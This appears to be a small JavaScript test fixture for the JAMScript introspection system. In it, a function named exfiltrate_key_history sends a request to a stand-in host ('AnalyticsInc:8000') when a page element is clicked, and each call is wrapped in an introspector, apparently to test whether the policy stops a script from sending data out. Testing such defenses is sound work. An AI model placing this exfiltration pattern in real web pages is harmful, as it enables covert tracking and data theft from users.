function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  var v2 = xmlhttp.open;
  var v3 = JAMScript.callIntrospect(v2.bind, v2, [xmlhttp], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  v0.opennew = v3;
  JAMScript.callIntrospect(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  JAMScript.callIntrospect(xmlhttp.send, xmlhttp, [null], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

